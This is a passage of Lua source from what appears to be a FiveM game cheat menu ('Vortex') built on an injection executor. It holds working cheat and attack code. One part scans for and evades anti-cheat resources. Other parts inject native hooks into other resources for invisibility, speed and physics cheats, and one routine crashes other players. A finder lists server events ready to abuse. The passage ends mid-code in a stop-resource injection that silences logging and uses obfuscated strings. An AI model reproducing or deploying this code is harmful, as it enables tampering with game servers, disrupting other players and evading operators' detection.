            local filesToCheck = {"fxmanifest.lua", "__resource.lua", "client.lua", "client/main.lua", "server.lua", "server/main.lua", "config.lua", "config.json", "init.lua"}

            for i = 0, GetNumResources() - 1 do
                local resName = GetResourceByFindIndex(i)
                if resName then
                    local resLower = string.lower(resName)
                    local desc = GetResourceMetadata(resName, "description", 0) or ""
                    local author = GetResourceMetadata(resName, "author", 0) or ""
                    local meta = string.lower(desc .. " " .. author)

                            -- try to parse manifests to discover referenced files (subfolders)
                            local discovered = {}
                            do
                                local ok, mf = pcall(LoadResourceFile, resName, "fxmanifest.lua")
                                if ok and mf and type(mf) == "string" then
                                    for _, p in ipairs(vortex_extractPaths(mf)) do discovered[p] = true end
                                else
                                    local ok2, mf2 = pcall(LoadResourceFile, resName, "__resource.lua")
                                    if ok2 and mf2 and type(mf2) == "string" then
                                        for _, p in ipairs(vortex_extractPaths(mf2)) do discovered[p] = true end
                                    end
                                end
                            end

                            -- merge discovered into file list to check
                            local extraFiles = {}
                            for k, _ in pairs(discovered) do table.insert(extraFiles, k) end

                            for _, ac in ipairs(vortex_antiCheatsToDetect) do
                                local acLower = string.lower(ac)
                                if string.find(resLower, acLower) or string.find(meta, acLower) then
                                    detections[resName] = ac
                                    break
                                end

                                -- check default common files
                                for _, fname in ipairs(filesToCheck) do
                                    local ok, content = pcall(LoadResourceFile, resName, fname)
                                    if ok and content and type(content) == "string" and string.find(string.lower(content), acLower) then
                                        detections[resName] = ac
                                        break
                                    end
                                end

                                if detections[resName] then break end

                                -- check discovered manifest paths (subfolders/files)
                                for _, fname in ipairs(extraFiles) do
                                    local ok, content = pcall(LoadResourceFile, resName, fname)
                                    if ok and content and type(content) == "string" and string.find(string.lower(content), acLower) then
                                        detections[resName] = ac
                                        break
                                    end
                                end

                                if detections[resName] then break end
                            end
                end
            end

            if next(detections) then
                for res, ac in pairs(detections) do
                    Vortex_Notify("Detected anti-cheat ('" .. tostring(ac) .. "') in resource: " .. tostring(res))
                    print("[AC SCAN] Detected \"" .. tostring(ac) .. "\" in resource: " .. tostring(res))
                end
            else
                Vortex_Notify("No known anti-cheats detected in resources")
                print("[AC SCAN] No known anti-cheats detected")
            end
        end)
    end,

    noclipbind = function()
        VortexNoclip.Toggle()
    end,

    nocliptype = function()
    end,

    invisible = function()
        vortex_invisibleEnabled = not vortex_invisibleEnabled
        if vortex_invisibleEnabled then
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", [[
                    local function HookNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end
                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    HookNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    HookNative("IsEntityVisible", function(originalFn, ...) return true end)
                    HookNative("IsEntityVisibleToScript", function(originalFn, ...) return true end)
                    HookNative("SetEntityVisible", function(originalFn, ped, toggle, unk)
                        if _G.osintInvisibility and _G.osintInvisibility.enabled then
                            return originalFn(ped, false, unk)
                        end
                        return originalFn(ped, toggle, unk)
                    end)

                    if not _G.osintInvisibility then
                        _G.osintInvisibility = {
                            enabled = false,
                            wasVisible = true,
                        }
                    end
                    if not _G.osintInvisibility.enabled then
                        _G.osintInvisibility.enabled = true
                        local ped = PlayerPedId()
                        _G.osintInvisibility.wasVisible = IsEntityVisible(ped)
            SetEntityVisible(ped, false, false)
                        CreateThread(function()
                            while _G.osintInvisibility and _G.osintInvisibility.enabled do
                                local currentPed = PlayerPedId()
                                if currentPed and DoesEntityExist(currentPed) then
                                    SetEntityVisible(currentPed, false, false)
                                end
                                Wait(500)
                            end
                        end)
                    end
                ]])
            end
        else
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", [[
                    if _G.osintInvisibility and _G.osintInvisibility.enabled then
                        _G.osintInvisibility.enabled = false
                        local ped = PlayerPedId()
                        if ped and DoesEntityExist(ped) then
                            SetEntityVisible(ped, _G.osintInvisibility.wasVisible, false)
                        end
                    end
                ]])
            end
        end
    end,

    fastrun = function()
        vortex_fastRunEnabled = not vortex_fastRunEnabled
        if vortex_fastRunEnabled then
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", [[
                    if _G.FastRunActive == nil then _G.FastRunActive = false end
                    if _G.FastRunThread == nil then
                        _G.FastRunThread = true

                        local CreateThread_fn = CreateThread
                        local PlayerPedId_fn = PlayerPedId
                        local PlayerId_fn = PlayerId
                        local SetRun_fn = SetRunSprintMultiplierForPlayer
                        local SetMove_fn = SetPedMoveRateOverride
                        local Wait_fn = Wait

                        CreateThread_fn(function()
                            while true do
                                Wait_fn(0)
                                if not _G.FastRunActive then
                                    Wait_fn(500)
                                    goto continue
                                end

                                local ped = PlayerPedId_fn()
                                if ped and ped ~= 0 then
                                    SetRun_fn(PlayerId_fn(), 1.49)
                                    SetMove_fn(ped, 1.49)
                                end
                                ::continue::
                            end
                        end)
                    end

                    _G.FastRunActive = true
                ]])
            end
        else
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", [[
                    _G.FastRunActive = false
                    local PlayerId_fn = PlayerId
                    local PlayerPedId_fn = PlayerPedId
                    SetRunSprintMultiplierForPlayer(PlayerId_fn(), 1.0)
                    SetPedMoveRateOverride(PlayerPedId_fn(), 1.0)
                ]])
            end
        end
    end,

    superjump = function()
        vortex_superJumpEnabled = not vortex_superJumpEnabled
        if vortex_superJumpEnabled then
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", [[
                    if not _G.vortex_superJumpEnabled then
                        _G.vortex_superJumpEnabled = true
                        local CreateThread_fn = CreateThread
                        local PlayerId_fn = PlayerId
                        local SetSuperJump_fn = SetSuperJumpThisFrame
                        local Wait_fn = Wait

                        CreateThread_fn(function()
                            while _G.vortex_superJumpEnabled do
                                SetSuperJump_fn(PlayerId_fn())
                                Wait_fn(0)
                            end
                        end)
                    else
                        _G.vortex_superJumpEnabled = true
                    end
                ]])
            end
        else
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", [[
                    _G.vortex_superJumpEnabled = false
                ]])
            end
        end
    end,

    noragdoll = function()
        vortex_noRagdollEnabled = not vortex_noRagdollEnabled

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                or (GetResourceState("ox_lib") == "started" and "ox_lib")
                or "any"

            if vortex_noRagdollEnabled then
                Susano.InjectResource(targetRes, [[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then return end
                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedRagdollOnCollision", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedCanRagdollFromPlayerImpact", function(originalFn, ...) return originalFn(...) end)
                    hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsPedRagdoll", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                    if vortex_noRagdollEnabled == nil then vortex_noRagdollEnabled = false end
                    vortex_noRagdollEnabled = true

                    local function startNoRagdoll()
                        local create = CreateThread
                        local wait = Wait
                        local pedId = PlayerPedId
                        local setCan = SetPedCanRagdoll
                        local setColl = SetPedRagdollOnCollision
                        local setImpact = SetPedCanRagdollFromPlayerImpact
                        local isRag = IsPedRagdoll
                        local clear = ClearPedTasksImmediately

                        create(function()
                            while vortex_noRagdollEnabled and not Unloaded do
                                local ped = pedId()
                                if ped and ped ~= 0 then
                                    setCan(ped, false)
                                    setColl(ped, false)
                                    setImpact(ped, false)
                                    if isRag(ped) then
                                        clear(ped)
                                    end
                                end
                                wait(0)
                            end

                            local ped = pedId()
                            if ped and ped ~= 0 then
                                setCan(ped, true)
                                setColl(ped, true)
                                setImpact(ped, true)
                            end
                        end)
                    end

                    startNoRagdoll()
                ]])
            else
                Susano.InjectResource(targetRes, [[
                    vortex_noRagdollEnabled = false
                ]])
            end
        end
    end,

    antifreeze = function()
        vortex_antiFreezeEnabled = not vortex_antiFreezeEnabled

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                or (GetResourceState("ox_lib") == "started" and "ox_lib")
                or "any"

            if vortex_antiFreezeEnabled then
                Susano.InjectResource(targetRes, [[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then return end
                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                    hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityPositionFrozen", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                    if vortex_antiFreezeEnabled == nil then vortex_antiFreezeEnabled = false end
                    vortex_antiFreezeEnabled = true

                    local function startAntiFreeze()
                        local create = CreateThread
                        local wait = Wait
                        local pedId = PlayerPedId
                        local isFrozen = IsEntityPositionFrozen
                        local unfreeze = FreezeEntityPosition
                        local clear = ClearPedTasks

                        create(function()
                            while vortex_antiFreezeEnabled and not Unloaded do
                                local ped = pedId()
                                if ped and ped ~= 0 and isFrozen(ped) then
                                    unfreeze(ped, false)
                                    clear(ped)
                                end
                                wait(0)
                            end
                        end)
                    end

                    startAntiFreeze()
                ]])
            else
                Susano.InjectResource(targetRes, [[
                    vortex_antiFreezeEnabled = false
                ]])
            end
        end
    end,

    throwvehicle = function()
        vortex_throwvehicleEnabled = not vortex_throwvehicleEnabled

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityVelocity", function(originalFn, ...) return originalFn(...) end)

                if not _G.vortex_throwvehicleEnabled then
                    _G.vortex_throwvehicleEnabled = false
                end
                _G.vortex_throwvehicleEnabled = %s

                if _G.vortex_throwvehicleEnabled then
                    CreateThread(function()
                        while _G.vortex_throwvehicleEnabled do
                            Wait(0)
                            local ped = PlayerPedId()
                            if IsPedInAnyVehicle(ped, false) then
                                local veh = GetVehiclePedIsIn(ped, false)
                                if veh and veh ~= 0 then
                                    local coords = GetEntityCoords(veh)
                                    SetEntityVelocity(veh, 0.0, 0.0, 50.0)
                                end
                            end
                        end
                    end)
                end
            ]], tostring(vortex_throwvehicleEnabled)))
        end
    end,

    editormode = function()
        vortex_editorModeEnabled = not vortex_editorModeEnabled
    end,

    menutheme = function()
        local themeNames = {}
        for name, _ in pairs(vortex_themes) do
            table.insert(themeNames, name)
        end
        table.sort(themeNames)

        if #themeNames == 0 then return end

        local currentIndex = 1
        for i, name in ipairs(themeNames) do
            if name == vortex_currentTheme then
                currentIndex = i
                break
            end
        end

        currentIndex = currentIndex + 1
        if currentIndex > #themeNames then
            currentIndex = 1
        end

        vortex_currentTheme = themeNames[currentIndex]

        local theme = vortex_themes[vortex_currentTheme] or vortex_themes[themeNames[1]]
        if not theme then return end

        VortexBanner.imageUrl = theme.banner
        vortex_bannerTexture = nil
        vortex_bannerWidth = 0
        vortex_bannerHeight = 0
        Vortex_LoadBannerTexture(VortexBanner.imageUrl)

        local color = theme.color or {1.0, 1.0, 1.0}
        VortexStyle.accentColor[1] = color[1]
        VortexStyle.accentColor[2] = color[2]
        VortexStyle.accentColor[3] = color[3]

        VortexStyle.selectedColor[1] = color[1]
        VortexStyle.selectedColor[2] = color[2]
        VortexStyle.selectedColor[3] = color[3]

        VortexStyle.scrollbarThumb[1] = color[1]
        VortexStyle.scrollbarThumb[2] = color[2]
        VortexStyle.scrollbarThumb[3] = color[3]

        VortexStyle.tabActiveColor[1] = color[1]
        VortexStyle.tabActiveColor[2] = color[2]
        VortexStyle.tabActiveColor[3] = color[3]
    end,

    changemenukeybind = function()
        Citizen.Wait(100)
        vortex_waitingForKey = true
        VortexMenu.isOpen = false
    end,

    showmenukeybinds = function()
        vortex_showMenuKeybindsEnabled = not vortex_showMenuKeybindsEnabled
    end,

    removekeybind = function(keybindAction)
        if keybindAction and vortex_actionKeybinds[keybindAction] then
            vortex_actionKeybinds[keybindAction] = nil
            print("^3[KEYBIND] Keybind removed for " .. keybindAction .. "^7")
        end
    end,

    applyClothing = function(ped, componentId, drawableId, textureId)
        SetPedComponentVariation(ped, componentId, drawableId, textureId, 0)
    end,

    applyProp = function(ped, propId, drawableId, textureId)
        if drawableId == -1 then
            ClearPedProp(ped, propId)
        else
            SetPedPropIndex(ped, propId, drawableId, textureId, true)
        end
    end,

    randomoutfit = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", [[
                local function UxrKYLp378()
                    local UwEsDxCfVbGtHy = PlayerPedId
                    local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                    local QwAzXsEdCrVfBg = SetPedComponentVariation
                    local LkJhGfDsAqWeRt = SetPedHeadBlendData
                    local MnBgVfCdXsZaQw = SetPedHairColor
                    local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                    local TyUiOpAsDfGhJk = SetPedHeadOverlay
                    local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                    local DfGhJkLzXcVbNm = ClearPedProp

                    local function PqLoMzNkXjWvRu(component, exclude)
                        local ped = UwEsDxCfVbGtHy()
                        local total = FdSaQwErTyUiOp(ped, component)
                        if total <= 1 then return 0 end
                        local choice = exclude
                        while choice == exclude do
                            choice = math.random(0, total - 1)
                        end
                        return choice
                    end

                    local function OxVnBmCxZaSqWe(component)
                        local ped = UwEsDxCfVbGtHy()
                        local total = FdSaQwErTyUiOp(ped, component)
                        return total > 1 and math.random(0, total - 1) or 0
                    end

                    local ped = UwEsDxCfVbGtHy()

                    QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                    QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                    QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                    QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                    QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                    local face = math.random(0, 45)
                    local skin = math.random(0, 45)
                    LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                    local hairMax = FdSaQwErTyUiOp(ped, 2)
                    local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                    QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                    MnBgVfCdXsZaQw(ped, 0, 0)

                    local brows = RtYuIoPlMnBvCx(2)
                    TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                    ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                    DfGhJkLzXcVbNm(ped, 0)
                    DfGhJkLzXcVbNm(ped, 1)
                end

                UxrKYLp378()
            ]])
        end
    end,


    initOutfitData = function()
        local ped = PlayerPedId()
        local hatIndex = GetPedPropIndex(ped, 0)
        vortex_outfitData.hat.drawable = hatIndex >= 0 and hatIndex or -1
        vortex_outfitData.hat.texture = hatIndex >= 0 and GetPedPropTextureIndex(ped, 0) or 0
        vortex_outfitData.mask.drawable = GetPedDrawableVariation(ped, 1)
        vortex_outfitData.mask.texture = GetPedTextureVariation(ped, 1)
        local glassesIndex = GetPedPropIndex(ped, 1)
        vortex_outfitData.glasses.drawable = glassesIndex >= 0 and glassesIndex or -1
        vortex_outfitData.glasses.texture = glassesIndex >= 0 and GetPedPropTextureIndex(ped, 1) or 0
        vortex_outfitData.torso.drawable = GetPedDrawableVariation(ped, 3)
        vortex_outfitData.torso.texture = GetPedTextureVariation(ped, 3)
        vortex_outfitData.tshirt.drawable = GetPedDrawableVariation(ped, 8)
        vortex_outfitData.tshirt.texture = GetPedTextureVariation(ped, 8)
        vortex_outfitData.pants.drawable = GetPedDrawableVariation(ped, 4)
        vortex_outfitData.pants.texture = GetPedTextureVariation(ped, 4)
        vortex_outfitData.shoes.drawable = GetPedDrawableVariation(ped, 6)
        vortex_outfitData.shoes.texture = GetPedTextureVariation(ped, 6)
    end,

    outfit_hat = function()
    end,

    outfit_mask = function()
    end,

    outfit_glasses = function()
    end,

    outfit_torso = function()
    end,

    outfit_tshirt = function()
    end,

    outfit_pants = function()
    end,

    outfit_shoes = function()
    end,

    model_male = function()
        local modelData = vortex_maleModels[vortex_selectedModelIndex.male]
        if modelData then
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", string.format([[
                    local susano = rawget(_G, "Susano")

                    if susano and type(susano) == "table" and type(susano.HookNative) == "function" then
                        susano.HookNative(0xC82758D1, function(ped, p1)
                            return true
                        end)

                        susano.HookNative(0xE169B653, function(ped)
                            return true
                        end)
                    end

                    Citizen.CreateThread(function()
                        local pedModel = "%s"
                        if not pedModel or pedModel == "" then return end

                        local modelHash = GetHashKey(pedModel)
                        if not modelHash or modelHash == 0 then return end

                        RequestModel(modelHash)
            local timeout = 0
                        while not HasModelLoaded(modelHash) and timeout < 100 do
                Citizen.Wait(10)
                timeout = timeout + 1
            end

                        if HasModelLoaded(modelHash) then
                            SetPlayerModel(PlayerId(), modelHash)
                            SetModelAsNoLongerNeeded(modelHash)

                        Citizen.Wait(100)

                            local playerPed = PlayerPedId()
                            if playerPed and playerPed ~= 0 then
                                SetPedDefaultComponentVariation(playerPed)
                                SetPedRandomComponentVariation(playerPed, true)
                                SetPedRandomProps(playerPed)
                                SetEntityInvincible(playerPed, false)
                                ClearPedTasksImmediately(playerPed)
                            end
                        end
                    end)
                ]], modelData.name))
            end
        end
    end,

    model_female = function()
        local modelData = vortex_femaleModels[vortex_selectedModelIndex.female]
        if modelData then
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", string.format([[
                    local susano = rawget(_G, "Susano")

                    if susano and type(susano) == "table" and type(susano.HookNative) == "function" then
                        susano.HookNative(0xC82758D1, function(ped, p1)
                            return true
                        end)

                        susano.HookNative(0xE169B653, function(ped)
                            return true
                        end)
                    end

                    Citizen.CreateThread(function()
                        local pedModel = "%s"
                        if not pedModel or pedModel == "" then return end

                        local modelHash = GetHashKey(pedModel)
                        if not modelHash or modelHash == 0 then return end

                        RequestModel(modelHash)
            local timeout = 0
                        while not HasModelLoaded(modelHash) and timeout < 100 do
                Citizen.Wait(10)
                timeout = timeout + 1
            end

                        if HasModelLoaded(modelHash) then
                            SetPlayerModel(PlayerId(), modelHash)
                            SetModelAsNoLongerNeeded(modelHash)

                        Citizen.Wait(100)

                            local playerPed = PlayerPedId()
                            if playerPed and playerPed ~= 0 then
                                SetPedDefaultComponentVariation(playerPed)
                                SetPedRandomComponentVariation(playerPed, true)
                                SetPedRandomProps(playerPed)
                                SetEntityInvincible(playerPed, false)
                                ClearPedTasksImmediately(playerPed)
                            end
                        end
                    end)
                ]], modelData.name))
            end
        end
    end,

    model_animals = function()
        local modelData = vortex_animalModels[vortex_selectedModelIndex.animals]
        if modelData then
            local model = GetHashKey(modelData.name)
            RequestModel(model)
            local timeout = 0
            while not HasModelLoaded(model) and timeout < 100 do
                Citizen.Wait(10)
                timeout = timeout + 1
            end
            if HasModelLoaded(model) then
                SetPlayerModel(PlayerId(), model)
                SetModelAsNoLongerNeeded(model)
            end
        end
    end,

    teleportinto = function()
        vortex_teleportIntoEnabled = not vortex_teleportIntoEnabled
    end,

    selectplayer = function(playerId)
        if vortex_selectedPlayers[playerId] then
            vortex_selectedPlayers[playerId] = nil
        else
            vortex_selectedPlayers[playerId] = true
            VortexMenu.selectedPlayer = playerId
        end
    end,

    selectmode = function()
        if vortex_selectMode == "all" then

            vortex_selectedPlayers = {}
            for _, playerData in ipairs(vortex_nearbyPlayers) do
                vortex_selectedPlayers[playerData.id] = true
            end
            if #vortex_nearbyPlayers > 0 then
                VortexMenu.selectedPlayer = vortex_nearbyPlayers[1].id
            end
        else

            vortex_selectedPlayers = {}
            VortexMenu.selectedPlayer = nil
        end
    end,

    none = function()

    end,

    misctarget = function()
        vortex_miscTargetEnabled = not vortex_miscTargetEnabled
    end,

    freecam = function()
        vortex_freecamEnabled = not vortex_freecamEnabled
        freecamSpeed = vortex_freecamSpeed
        local ok, err = pcall(EnableFreecam)
        if not ok then
            print("^1[FREECAM] Injection error: " .. tostring(err) .. "^0")
        end
        if vortex_freecamEnabled then
            print("^2[FREECAM] ActivÃ©e")
        else
            print("^1[FREECAM] DÃ©sactivÃ©e")
        end
    end,

    vortex = function()
        if type(FTK) ~= "table" then
            print("^1[Vortex] Crasher not initialized^7")
            return
        end
        print("^2[Vortex] Executing Crash Player v1 (no UI)^0")
        FTK.RefreshPlayerList()
        FTK.ExecuteSpawn(nil)
    end,

    triggersfinder = function(specificResource)
        if specificResource then
            print("^2[TRIGGERS FINDER] Searching in resource: ^5" .. specificResource)
        else
            print("^2[TRIGGERS FINDER] Searching for TriggerServerEvent calls...")
        end
        print("^3========================================")

        local allEvents = {}
        local eventCount = 0

        local numResources = GetNumResources()

        for i = 0, numResources - 1 do
            local resourceName = GetResourceByFindIndex(i)

            if specificResource and resourceName ~= specificResource then
                goto continue
            end

            if resourceName and GetResourceState(resourceName) == "started" then
                local numClientScripts = GetNumResourceMetadata(resourceName, 'client_script')
                if numClientScripts and numClientScripts > 0 then
                    for j = 0, numClientScripts - 1 do
                        local scriptPath = GetResourceMetadata(resourceName, 'client_script', j)
                        if scriptPath then
                            local success, scriptContent = pcall(function()
                                return LoadResourceFile(resourceName, scriptPath)
                            end)

                            if success and scriptContent then
                                for eventName in scriptContent:gmatch('TriggerServerEvent%s*%(%s*["\']([^"\']+)["\']') do
                                    if not allEvents[eventName] then
                                        allEvents[eventName] = {resource = resourceName, script = scriptPath}
                                        eventCount = eventCount + 1
                                    end
                                end
                            end
                        end
                    end
                end

                local numSharedScripts = GetNumResourceMetadata(resourceName, 'shared_script')
                if numSharedScripts and numSharedScripts > 0 then
                    for j = 0, numSharedScripts - 1 do
                        local scriptPath = GetResourceMetadata(resourceName, 'shared_script', j)
                        if scriptPath then
                            local success, scriptContent = pcall(function()
                                return LoadResourceFile(resourceName, scriptPath)
                            end)

                            if success and scriptContent then
                                for eventName in scriptContent:gmatch('TriggerServerEvent%s*%(%s*["\']([^"\']+)["\']') do
                                    if not allEvents[eventName] then
                                        allEvents[eventName] = {resource = resourceName, script = scriptPath}
                                        eventCount = eventCount + 1
                                    end
                                end
                            end
                        end
                    end
                end
            end

            ::continue::
        end

        local sortedEvents = {}
        for eventName, data in pairs(allEvents) do
            table.insert(sortedEvents, {name = eventName, resource = data.resource, script = data.script})
        end

        table.sort(sortedEvents, function(a, b)
            return a.name < b.name
        end)

        if eventCount == 0 then
            print("^1[TRIGGERS FINDER] No TriggerServerEvent found!")
        else
            print("^2[FOUND] " .. eventCount .. " TriggerServerEvent (ready to use):")
            print("^3========================================")

            for idx, event in ipairs(sortedEvents) do
                local readyToUse = string.format('TriggerServerEvent("%s")', event.name)
                print(string.format("^5[%d] ^2%s ^7(^3%s^7)", idx, readyToUse, event.resource))
            end
        end

        print("^3========================================")
        print("^2[TRIGGERS FINDER] Scan complete! Copy-paste the triggers above.")

        _G._FoundServerEvents = sortedEvents
    end,

    loadresources = function()
        local resourcesList = {}
        local numResources = GetNumResources()

        for i = 0, numResources - 1 do
            local resourceName = GetResourceByFindIndex(i)
            if resourceName and GetResourceState(resourceName) == "started" then
                table.insert(resourcesList, resourceName)
            end
        end

        table.sort(resourcesList)

        vortex_stopResourceList = resourcesList
        if vortex_selectedStopResource > #vortex_stopResourceList then
            vortex_selectedStopResource = 1
        end

        for _, resName in ipairs(resourcesList) do
            vortex_categories["resource_" .. resName] = {
                title = resName,
                items = {
                    {label = "Find Triggers", action = "findtrigger_resource", resourceName = resName},
                    {label = "Stop Resource", action = "stopresource", resourceName = resName}
                }
            }
        end

        for _, tab in ipairs(vortex_categories.misc.tabs) do
            if tab.name == "Resources" then
                tab.items = {}
                for _, resName in ipairs(resourcesList) do
                    table.insert(tab.items, {
                        label = resName,
                        action = "category",
                        target = "resource_" .. resName
                    })
                end
                break
            end
        end

    end,

    findtrigger_resource = function(self, resourceName)
        local targetResource = resourceName

        if not targetResource then
            local currentItem = nil
            if VortexMenu.currentCategory and vortex_categories[VortexMenu.currentCategory] then
                local items = vortex_categories[VortexMenu.currentCategory].items
                currentItem = items[VortexMenu.selectedIndex]
            end

            if currentItem and currentItem.resourceName then
                targetResource = currentItem.resourceName
            end
        end

        if targetResource then
            print("^2[TRIGGERS FINDER] Searching in resource: ^5" .. targetResource)
            print("^3========================================")

            local allEvents = {}
            local eventCount = 0

            local numResources = GetNumResources()

            for i = 0, numResources - 1 do
                local resourceName = GetResourceByFindIndex(i)

                if resourceName == targetResource and GetResourceState(resourceName) == "started" then
                    local numClientScripts = GetNumResourceMetadata(resourceName, 'client_script')
                    if numClientScripts and numClientScripts > 0 then
                        for j = 0, numClientScripts - 1 do
                            local scriptPath = GetResourceMetadata(resourceName, 'client_script', j)
                            if scriptPath then
                                local success, scriptContent = pcall(function()
                                    return LoadResourceFile(resourceName, scriptPath)
                                end)

                                if success and scriptContent then
                                    for eventName in scriptContent:gmatch('TriggerServerEvent%s*%(%s*["\']([^"\']+)["\']') do
                                        if not allEvents[eventName] then
                                            allEvents[eventName] = {resource = resourceName, script = scriptPath}
                                            eventCount = eventCount + 1
                                        end
                                    end
                                end
                            end
                        end
                    end

                    local numSharedScripts = GetNumResourceMetadata(resourceName, 'shared_script')
                    if numSharedScripts and numSharedScripts > 0 then
                        for j = 0, numSharedScripts - 1 do
                            local scriptPath = GetResourceMetadata(resourceName, 'shared_script', j)
                            if scriptPath then
                                local success, scriptContent = pcall(function()
                                    return LoadResourceFile(resourceName, scriptPath)
                                end)

                                if success and scriptContent then
                                    for eventName in scriptContent:gmatch('TriggerServerEvent%s*%(%s*["\']([^"\']+)["\']') do
                                        if not allEvents[eventName] then
                                            allEvents[eventName] = {resource = resourceName, script = scriptPath}
                                            eventCount = eventCount + 1
                                        end
                                    end
                                end
                            end
                        end
                    end
                    break
                end
            end

            local sortedEvents = {}
            for eventName, data in pairs(allEvents) do
                table.insert(sortedEvents, {name = eventName, resource = data.resource, script = data.script})
            end

            table.sort(sortedEvents, function(a, b)
                return a.name < b.name
            end)

            if eventCount == 0 then
                print("^1[TRIGGERS FINDER] No TriggerServerEvent found in " .. targetResource .. "!")
            else
                print("^2[FOUND] " .. eventCount .. " TriggerServerEvent (ready to use):")
                print("^3========================================")

                for idx, event in ipairs(sortedEvents) do
                    local readyToUse = string.format('TriggerServerEvent("%s")', event.name)
                    print(string.format("^5[%d] ^2%s ^7(^3%s^7)", idx, readyToUse, event.resource))
                end
            end

            print("^3========================================")
            print("^2[TRIGGERS FINDER] Scan complete! Copy-paste the triggers above.")
        end
    end,

    stopresource = function(self, resourceName)
        if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
            print("^1[STOP RESOURCE] Susano.InjectResource non disponible!^7")
            return
        end

        local targetResource = resourceName

        if not targetResource then
            local currentItem = nil
            if VortexMenu.currentCategory and vortex_categories[VortexMenu.currentCategory] then
                local items = vortex_categories[VortexMenu.currentCategory].items
                currentItem = items[VortexMenu.selectedIndex]
            end

            if currentItem and currentItem.resourceName then
                targetResource = currentItem.resourceName
            end
        end

        if not targetResource or GetResourceState(targetResource) ~= "started" then
            return
        end

        Susano.InjectResource(targetResource, [[
            local p = print
            local w = warn
            local e = error
            p = function() end
            w = function() end
            e = function() end

            if Citizen then
                local t = Citizen.Trace
                local _tb = {}
                for _,w in ipairs({
                    (function()local k=8;local b={108,109,106,125,111};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                    (function()local k=15;local b={115,116,131,116,114,131};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                    (function()local k=21;local b={139,126,132,129,118,137,126,132,131};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                    (function()local k=9;local b={106,111,108,104,123};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                    (function()local k=6;local b={111,116,112,107,105,120};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                    (function()local k=3;local b={107,114,114,108};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
                    (function()local k=12;local b={127,129,127,109,122,123};local r='';for i=1,#b do r=r..string.char((b[i]-k)%256)end;return r end)(),
